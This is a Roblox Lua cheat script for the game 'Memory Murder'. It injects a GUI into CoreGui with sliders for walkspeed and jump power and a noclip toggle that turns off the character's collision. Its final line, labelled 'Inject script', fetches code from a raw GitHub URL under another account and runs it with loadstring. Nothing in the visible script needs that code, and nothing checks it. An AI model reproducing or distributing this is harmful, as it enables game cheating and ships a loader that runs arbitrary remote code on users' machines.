-- 📦 Memory Murder UI Script by @Luminaprojects
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

-- Main UI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "MemoryMurderUI"
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 320, 0, 230)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -115)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 12)

-- Title
local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "📦 Memory Murder"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true

-- Toggle UI button
local ToggleButton = Instance.new("TextButton", ScreenGui)
ToggleButton.Size = UDim2.new(0, 120, 0, 35)
ToggleButton.Position = UDim2.new(0, 10, 0.4, 0)
ToggleButton.Text = "🔘 TOGGLE UI"
ToggleButton.Font = Enum.Font.Gotham
ToggleButton.TextSize = 16
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Instance.new("UICorner", ToggleButton).CornerRadius = UDim.new(0, 8)

ToggleButton.MouseButton1Click:Connect(function()
	MainFrame.Visible = not MainFrame.Visible
end)

-- Function: Create slider
local function createSlider(parent, name, min, max, default, callback)
	local label = Instance.new("TextLabel", parent)
	label.Size = UDim2.new(1, -20, 0, 20)
	label.Position = UDim2.new(0, 10, 0, #parent:GetChildren() * 25 + 5)
	label.BackgroundTransparency = 1
	label.Text = name .. ": " .. default
	label.TextColor3 = Color3.new(1, 1, 1)
	label.Font = Enum.Font.Gotham
	label.TextSize = 14
	label.TextXAlignment = Enum.TextXAlignment.Left

	local slider = Instance.new("TextButton", parent)
	slider.Size = UDim2.new(1, -20, 0, 20)
	slider.Position = label.Position + UDim2.new(0, 0, 0, 20)
	slider.Text = ""
	slider.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	slider.AutoButtonColor = false
	Instance.new("UICorner", slider).CornerRadius = UDim.new(0, 6)

	local fill = Instance.new("Frame", slider)
	fill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
	fill.Size = UDim2.new((default - min)/(max - min), 0, 1, 0)
	fill.Position = UDim2.new(0, 0, 0, 0)
	fill.BorderSizePixel = 0
	Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 6)

	local dragging = false
	slider.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input.Position then
			local x = input.Position.X - slider.AbsolutePosition.X
			local percent = math.clamp(x / slider.AbsoluteSize.X, 0, 1)
			fill.Size = UDim2.new(percent, 0, 1, 0)
			local value = math.floor(min + (max - min) * percent)
			label.Text = name .. ": " .. value
			callback(value)
		end
	end)
end

-- Walkspeed Slider
createSlider(MainFrame, "Walkspeed", 16, 200, 16, function(v)
	LocalPlayer.Character.Humanoid.WalkSpeed = v
end)

-- Jumppower Slider
createSlider(MainFrame, "JumpPower", 50, 200, 50, function(v)
	LocalPlayer.Character.Humanoid.JumpPower = v
end)

-- Noclip
local noclipEnabled = false
local noclipBtn = Instance.new("TextButton", MainFrame)
noclipBtn.Size = UDim2.new(1, -20, 0, 30)
noclipBtn.Position = UDim2.new(0, 10, 0, 160)
noclipBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
noclipBtn.Text = "🚪 Noclip: OFF"
noclipBtn.Font = Enum.Font.GothamBold
noclipBtn.TextColor3 = Color3.new(1, 1, 1)
noclipBtn.TextSize = 14
Instance.new("UICorner", noclipBtn).CornerRadius = UDim.new(0, 6)

noclipBtn.MouseButton1Click:Connect(function()
	noclipEnabled = not noclipEnabled
	noclipBtn.Text = "🚪 Noclip: " .. (noclipEnabled and "ON" or "OFF")
end)

game:GetService("RunService").Stepped:Connect(function()
	if noclipEnabled and LocalPlayer.Character then
		for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") and v.CanCollide == true then
				v.CanCollide = false
			end
		end
	end
end)

-- RGB Credit
local rgbText = Instance.new("TextLabel", ScreenGui)
rgbText.Size = UDim2.new(0, 300, 0, 25)
rgbText.Position = UDim2.new(0.5, -150, 1, -30)
rgbText.BackgroundTransparency = 1
rgbText.Text = "🔎 Script by - @Luminaprojects"
rgbText.Font = Enum.Font.GothamBold
rgbText.TextSize = 14
rgbText.TextColor3 = Color3.new(1, 0, 0)

task.spawn(function()
	while true do
		for i = 0, 1, 0.01 do
			rgbText.TextColor3 = Color3.fromHSV(i, 1, 1)
			wait()
		end
	end
end)

-- Inject script
loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
